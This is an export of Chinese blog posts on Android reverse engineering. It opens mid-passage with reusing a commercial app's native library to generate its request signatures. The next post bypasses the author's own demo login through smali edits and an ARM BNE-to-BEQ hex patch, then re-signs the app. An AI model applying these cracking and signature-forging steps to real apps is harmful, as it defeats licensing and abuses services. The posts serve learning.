class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(arg2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"bytes is null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d.a(arg2, <span class="number">0</span>, arg2.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到他又是调用了另外一个d.a进行计算的，我们再来跟进去看。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] arg9, <span class="keyword">int</span> arg10, <span class="keyword">int</span> arg11)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(arg9 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"bytes is null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(arg10 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arg10 + arg11 &gt; arg9.length) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> v0 = arg11 * <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">char</span>[] v1 = <span class="keyword">new</span> <span class="keyword">char</span>[v0];</span><br><span class="line">            <span class="keyword">int</span> v3 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> v4 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(v3 &lt; arg11) &#123;</span><br><span class="line">                <span class="keyword">int</span> v5 = arg9[v3 + arg10] &amp; <span class="number">255</span>;</span><br><span class="line">                <span class="keyword">int</span> v6 = v4 + <span class="number">1</span>;</span><br><span class="line">                v1[v4] = d.a[v5 &gt;&gt; <span class="number">4</span>];</span><br><span class="line">                v4 = v6 + <span class="number">1</span>;</span><br><span class="line">                v1[v6] = d.a[v5 &amp; <span class="number">15</span>];</span><br><span class="line">                ++v3;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(v1, <span class="number">0</span>, v0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这下子就很清楚了，一个算法，这个算法虽然点难看，混淆有点严重，但是还是相对而言不难的，并且非常好的一点就是，他居然没有调用外部的函数了，这就很是让人开心。<br>得出结论，其实也就是调用了最后一个这个函数，通过传入as的byte数组，然后最终返回对应的字符串，是不是很简单，那我们来实践一下，的到最后的执行结果：<br><img src="img12.jpg" alt="解密结果"><br>不对啊，和我们之前的那个mas相差很大，根本就是不一样，那么我们是哪里出错了？<br>仔细观察发现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.h.encode(v14_2.getBytes())</span><br></pre></td></tr></table></figure>
<p>他传给a的是一个编码之后的byte数组，这下子了解了，那么我们继续跟踪这个h方法，跟进去之后发现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ISdk h;</span><br></pre></td></tr></table></figure>
<p>跟进去这个对象发现居然是一个接口：<br><img src="img13.jpg" alt="h接口"><br>那么没办法，我们只能继续跟踪，看看是到底哪一个实现类来实例化的h变量，最终我们找到：<br><img src="img14.jpg" alt="h的实例化"><br>很明显是一个单例的对象，我们来看看这个SDK到底是个什么东西。<br><img src="img15.jpg" alt="getSDK"><br>发现最后返回的是a，而这个a是通过b.a来实现的，我们跟进去这个a方法（混淆有点严重大家仔细看），发现返回值是一个b，这就好办，那么我们跟进这个b类：<br><img src="img16.jpg" alt="b类"><br>确实是实现了ISdk这个接口，那么我们就来找这个encode的方法：<br><img src="img17.jpg" alt="encode"><br>发现居然是另外一个类的方法，那么没办法我们继续跟：<br><img src="img18.jpg" alt="真正的encode"><br>然人心有一点寒，居然是个本地方法，也就是说实现是在Linux的动态链接库so文件中进行实现的，是不是和我在上面说的DLL文件加载是类似，这就是为什么我要在一开始局那个例子，好了，没办法，我们只能硬着头皮来了，找so层加密：<br>静态代码块中找到了他的so文件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"cms"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(UnsatisfiedLinkError ) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>是cms这个so文件，我们将它拖出来，放进IDA进行分析：<br>来到我们的导出表：<br><img src="img19.jpg" alt="导出表"><br>又是混淆加固，那我们来看看是不是动态注册中能找到什么，发现什么也没有，无从下手，只能动态调试了。<br>但是对于一个参数这样打动干着实在让人觉得有点屈，而且你会发现复现so层的代码有点不现实，那么我们的间接加密的思想就显得尤为重要了。</p>
<h3 id="用魔法打败魔法"><a href="#用魔法打败魔法" class="headerlink" title="用魔法打败魔法"></a>用魔法打败魔法</h3><p>这句话说的很好，你的加密坚不可摧，你做的很好，但是我们也不是笨蛋，我们也要想办法解决，既然没办法找出算法，那么只能间接加密，重头戏在下面，也是本文的重点，希望大家认真！<br>首先我们要模仿他引入我们的so文件：<br><img src="img20.jpg" alt="导入so文件"><br>导入之后我们就模仿他在他的那个java包中新建我们的类：<br><img src="img21jpg" alt="导入加密类"><br>这里需要注意的是，我们的包名和类名要和他的一模一样，就算是混淆，我们也需要一样，然后我们来运行一下看下是否正常：<br><img src="img22.jpg" alt="异常"><br>问题来了，Linux的单步执行异常，并且我们毫无头绪，不知道如何是好，代码也没错啊，那到底也是什么问题？当你看到这句异常的时候我可以告诉你，很那解决，并且我还知道你用的是Android5.0以下的模拟器，也就是dalvik的虚拟机，他并不知道该怎么做，其实这里是他的一个解析机制，这里不想详细的去说（会脱壳的应该懂），那么我们应该怎么办，使我们接下来要解决的，我们需要换成ART虚拟机进行纠错，也就是Android5.0以上的版本，他因为是在安装运行的时候是转为OAT这个ELF可执行文件，所以可以给我们异常的具体信息，我们换成高版本模拟器来看下：<br><img src="img23.jpg" alt="异常信息"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">art&#x2F;runtime&#x2F;java_vm_ext.cc:410] JNI DETECTED ERROR IN APPLICATION: JNI NewStringUTF called with pending exception java.lang.ClassNotFoundException: Didn&#39;t find class &quot;com.ss.android.common.applog.UserInfo&quot; on path: DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;com.example.magic-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;com.example.magic-1&#x2F;lib&#x2F;arm, &#x2F;data&#x2F;app&#x2F;com.example.magic-1&#x2F;base.apk!&#x2F;lib&#x2F;armeabi, &#x2F;vendor&#x2F;lib, &#x2F;system&#x2F;lib, &#x2F;system&#x2F;lib&#x2F;arm]]</span><br></pre></td></tr></table></figure>
<p>可以看到关键的异常信息：<br><code>Didn&#39;t find class &quot;com.ss.android.common.applog.UserInfo&quot;</code><br>原来是你干的，缺少了一个类，那么没办法，我们只能将这个类找回来，包名都给我们了，就很好办了，最后拷贝得到：<br><img src="img24.jpg" alt="缺少的user类"><br>确实，这个类也是这个的一员，我们放好之后，将我们的加密函数也写好，最后进行一个完整的加密：<br><img src="img25.jpg" alt="加密成功"><br>可以看到最终我们得到了我们想要的结果。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们需要巧用间接引用，在我们的加密过程中是很重要的。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Android so验证小试牛刀</title>
    <url>/2020/03/19/Android-so%E9%AA%8C%E8%AF%81%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/</url>
    <content><![CDATA[<h1 id="Android破解"><a href="#Android破解" class="headerlink" title="Android破解"></a>Android破解</h1><p>因为一些需要，最近在搞这方面的东西，也分享一下自己在破解过程中的一些过程，下面一一个验证作为例子。</p>
<h2 id="例子效果"><a href="#例子效果" class="headerlink" title="例子效果"></a>例子效果</h2><p>其实就是一个简单的输入账号密码的验证，也不是账号密码，就是根据第一条输入进行加密，得到的结果与第二条对比，然后做出比较。<br><img src="img1.jpg" alt="例子常规"><br>例子的关键代码我会在文章底部贴出。</p>
<h2 id="Smali层破解"><a href="#Smali层破解" class="headerlink" title="Smali层破解"></a>Smali层破解</h2><p>首先，按常规的话呢，我们是需要进行反编译的（这个例子没加一些乱七八糟的东西）。拖进反编译工具看一下：<br><img src="img2.jpg" alt="文件结构"><br>可以看到基本没有什么，比较受关注的就是三个文件：NativeClass、MainActivity和他的内部类。这三个文件是我们要进行破解的关键要素，首先我们可以看到程序输入错误的时候会设置标题为<code>fail</code>。<br>所以这个字符串是我们破解的第一个关键点，所以我们搜索关键字fail，会得到下面的一处地方：<br><img src="img3.jpg" alt="关键字符串"><br>只有一处，所以我们就大胆的跟进去就好了。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.line</span> 36</span><br><span class="line">:cond_0</span><br><span class="line">iget-object v0, p0, <span class="class">Lcom/example/testjni/MainActivity$1;</span>-&gt;this$0:<span class="class">Lcom/example/testjni/MainActivity;</span></span><br><span class="line"></span><br><span class="line">const-string v1, <span class="string">"fail"</span></span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, <span class="class">Lcom/example/testjni/MainActivity;</span>-&gt;setTitle(<span class="class">Ljava/lang/CharSequence;</span>)V</span><br><span class="line"></span><br><span class="line">goto<span class="keyword"> :goto_0</span></span><br></pre></td></tr></table></figure>
<p>可以分析到，我们这就是一个条件的落脚点，也就是说我们很有可能是在一个if的分支上，所以我们找他是从那个地方跳转过来的。<br><img src="img4.jpg" alt="if"><br>可以看到是根据上面一个静态函数的返回值来确定我们是要跳去哪个地方，所以我们在看一下<code>access$2</code>这个方法，这个方法是内部类调用外部成员的时候所自动命名的。<br><img src="img5.jpg" alt="access2"><br>可以看到他的返回值其实也就是<code>Checkpass</code>这个方法的返回值，所以我们的关键是看一下这个方法：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span><span class="keyword"> static</span> Checkpass(<span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span>)Z</span><br><span class="line"><span class="keyword">    .locals</span> 7</span><br><span class="line"><span class="keyword">    .param</span> p0, <span class="string">"username"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"password"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 44</span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 45</span><br><span class="line"><span class="keyword">    .local</span> v2, <span class="string">"flag"</span>:Z</span><br><span class="line">   <span class="built_in"> new-instance </span>v3, <span class="class">Ljava/lang/StringBuffer;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v3&#125;, <span class="class">Ljava/lang/StringBuffer;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 46</span><br><span class="line"><span class="keyword">    .local</span> v3, <span class="string">"sb"</span>:<span class="class">Ljava/lang/StringBuffer;</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0&#125;, <span class="class">Ljava/lang/String;</span>-&gt;toCharArray()[C</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 47</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"cs"</span>:[C</span><br><span class="line">   <span class="built_in"> array-length </span>v5, v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>v4, 0x0</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :goto_0</span></span><br><span class="line">   <span class="built_in"> if-lt </span>v4, v5,<span class="keyword"> :cond_1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 51</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v3&#125;, <span class="class">Ljava/lang/StringBuffer;</span>-&gt;toString()<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v4</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1, v4&#125;, <span class="class">Ljava/lang/String;</span>-&gt;equalsIgnoreCase(<span class="class">Ljava/lang/String;</span>)Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result </span>v4</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> if-eqz </span>v4,<span class="keyword"> :cond_0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 52</span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 53</span><br><span class="line">   <span class="keyword"> :cond_0</span></span><br><span class="line">   <span class="built_in"> return </span>v2</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 47</span><br><span class="line">   <span class="keyword"> :cond_1</span></span><br><span class="line">   <span class="built_in"> aget-char </span>v0, v1, v4</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 48</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"c"</span>:C</span><br><span class="line">   <span class="built_in"> add-int/lit8 </span>v6, v0, 0x1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> int-to-char </span>v0, v6</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 49</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v3, v0&#125;, <span class="class">Ljava/lang/StringBuffer;</span>-&gt;append(C)<span class="class">Ljava/lang/StringBuffer;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 47</span><br><span class="line">   <span class="built_in"> add-int/lit8 </span>v4, v4, 0x1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>
<p>方法有点长，其实自己跟一下也就能发现，其实这个检查密码的方法在跳出的时候是要进行一个v2寄存器值的设置的：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.line</span> 53</span><br><span class="line">:cond_0</span><br><span class="line">return v2</span><br></pre></td></tr></table></figure>
<p>所以我们跟踪是谁跳到了cond_0这个地方的：<br><code>if-eqz v4, :cond_0</code>这个地方是唯一一处跳过来的代码，但是仔细会发现，这个离得十分的近，而且明显就是上句下句的关系：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">if-eqz v4,<span class="keyword"> :cond_0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 52</span><br><span class="line">const/4 v2, 0x1</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 53</span><br><span class="line">:cond_0</span><br><span class="line">return v2</span><br></pre></td></tr></table></figure>
<p>比较有意思的来了，可以看到，再调过来的时候，如果v4等于0，那么将跳过将v2设置为1（true）的一个过程，然后v2被设置的地方，只有初始化：<code>const/4 v2, 0x0</code>和这个0x1，所以这个是一个关键点。所以我们可以将初始化的时候将这个v2直接改为1是一种方法。<br>回过头来看内部类的跳转，发现其实我们只要不让内部类进行跳转的话呢，也是可以避免跳转到fail字符串地方的。<br>这两种方法都可以。<br>动态调试smali层就不分析了，其实是一样的，而且我的调试工具不出现寄存器，所以不是很方便。</p>
<h2 id="错误之处"><a href="#错误之处" class="headerlink" title="错误之处"></a>错误之处</h2><p>我们进行反编译和签名之后，在模拟器上进行运行，但是你会发现，居然还是出现了fail这个字样，这个是为什么呢？我们就需要回过头来再看一下，发现在我们的if语句跳转到正常之后，我们的字符串是由<code>encodestr</code>这个字符串进行间接传递的，也就是说我们需要关注的是<code>encodestr</code>这个方法，但是我们发现这个方法是本地的，也就是在smali这一层我们是无法进行修改的（其实我们可以将这个检测删掉，然后改为正常，但是这种做法只能针对极少数，因为本地方法执行的东西有可能很多，所以删除掉是不明智的）。<br><img src="img6.jpg" alt="伪代码"><br>所以我们就需要跟踪到so层进行第二层验证的分析。</p>
<h2 id="so层验证"><a href="#so层验证" class="headerlink" title="so层验证"></a>so层验证</h2><p>看一下程序的so文件：<br><img src="img7.jpg" alt="so文件"><br>就这么一个，所以分析起来很好办<br>我们使用IDA进行动态的调试，包名一看就知道是哪个了，载入IDA之后我们来到我们所加载的程序层的那个so文件：<br><img src="img8.jpg" alt="so文件列表"><br>打开这个之后我们来找我们的一个关键代码，因为我们在smali层分析出是<code>encodestr</code>这个方法进行的一个二次验证，所以我们就要来找这个函数：<br><img src="img9.jpg" alt="函数列表"><br>显而易见，是这个函数，虽然不是一模一样，但是基本一样，不一样的原因是因为我javah生成的一个规范问题，这个我在文章底部贴出代码的时候你们就会知道。<br>我们看一下大体的流程图：<br><img src="img10.jpg" alt="流程图"><br>虽然截取的不完全，但是关键截取到了，上面的那一个不是很关键，就是一个顺序执行，没有跳转，我们就要来分析一下这个函数的一个执行流程。<br>首先我们分析右半部分，发现非常的直观，是一个极其明显的for循环，判断的一局是根据R0与R5的一个值进行判断的，如果破解玩的多的话呢，可以了解到这块东西不是我们想要关注的，除非你想要制作注册机，这块是密码的加密算法，我们看完之后，来到左半部分，发现一个分支，是由我们的跳转语句BNE来决定的，这个判断是在我们的循环语句执行过后进行判断的，很有可能是我们的关键跳，我们来看一下分支的结构：<br><img src="img11.jpg" alt="关键分析点"><br>仔细看，发现有个ADD指令，分开的两个ADD指令分别调用了堆栈的指定偏移处，左边的比右边的小了八个字节，注意这八个字节，让我们来猜一下：，应该存在两个字符，这两个字符的指针存放在堆栈中，所以这两个字符指针是局部变量，而且是连着的，我们动态调试一下：<br><img src="img12.jpg" alt="字符比较"><br>所以现在我们基本可以确定这个BNE使我们比较关键的跳转，设置BNE的反向跳转就可以了（简单改），所以下面如何进行BNE指令的修改是我们的关键要素，SO文件的修改和win32修改是有很大差别的，相对而言麻烦一些，看下面的操作：</p>
<ol>
<li>首先我们跳转到我们的HEX页面，跟随我们的BNE：</li>
</ol>
<p><img src="img13.jpg" alt="BNE"><br>两个字节应该是thumb，我们要修改为BEQ，这样子我们就可以实现反向跳转，ARM这边小端存储，也就是本机字节顺序，所以准确的说是D102，二进制是：‭1101000100000010‬，很明确的分析出8-11位为0001，我们要改为BEQ，所以要改这个1为0，所以就是1101000000000010，转为16进制就是D002，再转为小端存储，也就是02D0，分析到这里就足够了。</p>
<ol start="2">
<li><p>使用二进制编辑工具修改so（无所谓哪个）</p>
<ul>
<li><p>搜索我们的关键字节（随便找一个临近的）<br><img src="img14.jpg" alt="特征字节"></p>
</li>
<li><p>找到之后，将D1改为D0，最后导出</p>
</li>
<li><p>导出之后重新编译，签名。</p>
</li>
</ul>
</li>
</ol>
<p><img src="img15.jpg" alt="效果"><br>可以看到，确实是成功了。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在我们进行SO层调试的时候，动态调试，如果你调试的是源程序，也就是说没有过Smali层，我们是没办法进入右边分支的，只有过了Smali层的验证，才能进行so的错误验证。<br>所以这个东西是一步一步来的，不能一蹴而就</p>
<h2 id="java层与C-层代码分析"><a href="#java层与C-层代码分析" class="headerlink" title="java层与C++层代码分析"></a>java层与C++层代码分析</h2><p>贴上源代码层的源码：<br>java层（Smali层）代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span></span><br><span class="line">	&#123;</span><br><span class="line">		System.loadLibrary(<span class="string">"TestJNI"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Button Login;</span><br><span class="line">	<span class="keyword">private</span> EditText username;</span><br><span class="line">	<span class="keyword">private</span> EditText password;</span><br><span class="line">	NativeClass nc = <span class="keyword">new</span> NativeClass();</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		Login = (Button) findViewById(R.id.soLogin);</span><br><span class="line">		username = (EditText) findViewById(R.id.username);</span><br><span class="line">		password = (EditText) findViewById(R.id.password);</span><br><span class="line">		Login.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(Checkpass(username.getText().toString(),password.getText().toString()))</span><br><span class="line">				&#123;</span><br><span class="line">					MainActivity.<span class="keyword">this</span>.setTitle(nc.encodestr(username.getText().toString(),password.getText().toString()));</span><br><span class="line">				&#125;<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					MainActivity.<span class="keyword">this</span>.setTitle(<span class="string">"fail"</span>);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">Checkpass</span><span class="params">(String username,String password)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">char</span>[] cs = username.toCharArray();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">char</span> c:cs)&#123;</span><br><span class="line">			c++;</span><br><span class="line">			sb.append(c);</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">if</span>(password.equalsIgnoreCase(sb.toString()))</span><br><span class="line">			flag = <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">return</span> flag;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C++层（so层）验证：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">JNIEXPORT jstring JNICALL Java_com_example_testjni_NativeClass_encodestr</span><br><span class="line">  (JNIEnv * env, jobject jstr, jstring username, jstring password)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> succcess[] = <span class="string">"success"</span>;</span><br><span class="line">	<span class="keyword">char</span> fail[] = <span class="string">"fail"</span>;</span><br><span class="line">	<span class="keyword">char</span> *nativeusername = Jstring2CStr(env,username);</span><br><span class="line">	<span class="keyword">char</span> *nativepassword = Jstring2CStr(env,password);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(nativeusername); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		*(nativeusername + i) += <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(nativeusername,nativepassword)==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> env-&gt;NewStringUTF(succcess);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> env-&gt;NewStringUTF(fail);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不关键的代码我就不列举出来了，其实就是一个简单的java层和NDK的验证。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前一直玩的是Windows平台下的破解和外挂制作，Unix下的不怎么玩，这也是最近在做一些计算机组成原理分析才玩的，相对于ASM，ARM熟练程度还是不够。</p>
<hr>
<p>这里我还想再问一下，之前论坛发帖，有谁能解决一下这个eclipse无法显示寄存的问题呢？‬</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Android破解检验</title>
    <url>/2020/03/16/Android%E7%A0%B4%E8%A7%A3%E6%A3%80%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="简单程序破解"><a href="#简单程序破解" class="headerlink" title="简单程序破解"></a>简单程序破解</h1><p>对于简单的字符串类型的校验，客户端的校验破解起来时比较简单的。<br>java层代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Button btn_login;</span><br><span class="line">	<span class="keyword">private</span> EditText username;</span><br><span class="line">	<span class="keyword">private</span> EditText password;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		btn_login = (Button) findViewById(R.id.btn_Login);</span><br><span class="line">		username = (EditText) findViewById(R.id.username);</span><br><span class="line">		password = (EditText) findViewById(R.id.password);</span><br><span class="line">		btn_login.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(username.getText().toString().equals(<span class="string">"wker"</span>) &amp;&amp; password.getText().toString().equals(<span class="string">"wfc"</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"success"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">				&#125;<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"false"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没什么特别的只是单纯的进行了一个字符串的校验，校验完毕就弹出一个toast。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>我们先用逆向的工具加载APK，Android Killer就够了，我们得到这个样子的一个文件视图：<br><img src="img1.jpg" alt="文件视图"><br>可以看到，在我们的MainActivity中分出了两个smali文件，一个是我们的内部类，其实我们也就知道了，也就是我们在点击响应事件中的那个内部类，所以我们就直接分析就好了。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.class</span> <span class="class">Lcom/pj/crack_one/MainActivity$1;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></span><br><span class="line"><span class="keyword">.source</span> <span class="string">"MainActivity.java"</span></span><br></pre></td></tr></table></figure>
<p>这个就是简单的声明了一下类的一些信息，名称啊，父类啊之类的。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="comment"># interfaces</span></span><br><span class="line"><span class="keyword">.implements</span> <span class="class">Landroid/view/View$OnClickListener;</span></span><br></pre></td></tr></table></figure>
<p>实现的接口。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="comment"># annotations</span></span><br><span class="line"><span class="keyword">.annotation</span><span class="keyword"> system</span> <span class="class">Ldalvik/annotation/EnclosingMethod;</span></span><br><span class="line">    value = <span class="class">Lcom/pj/crack_one/MainActivity;</span>-&gt;onCreate(<span class="class">Landroid/os/Bundle;</span>)V</span><br><span class="line"><span class="keyword">.end annotation</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.annotation</span><span class="keyword"> system</span> <span class="class">Ldalvik/annotation/InnerClass;</span></span><br><span class="line">    accessFlags = 0x0</span><br><span class="line">    name = null</span><br><span class="line"><span class="keyword">.end annotation</span></span><br></pre></td></tr></table></figure>
<p>这个貌似是一个注解，具体是什么意思暂时不了解，不影响。</p>
